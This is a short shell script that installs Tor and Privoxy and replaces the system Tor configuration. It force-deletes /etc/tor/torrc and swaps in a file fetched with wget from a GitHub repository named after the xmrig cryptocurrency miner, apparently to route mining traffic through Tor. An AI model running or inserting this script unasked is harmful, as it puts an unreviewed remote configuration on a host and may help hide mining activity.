#!/bin/sh

apt-get update && apt-get upgrade -y && apt update && apt upgrade -y 
apt-get install nano -y && apt-get install tor -y && apt-get install privoxy -y
apt-get install --reinstall systemd
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/torrc
/etc/init.d/tor stop
rm -rf /etc/tor/torrc
cp torrc /etc/tor/torrc
systemctl enable tor
/etc/init.d/tor start
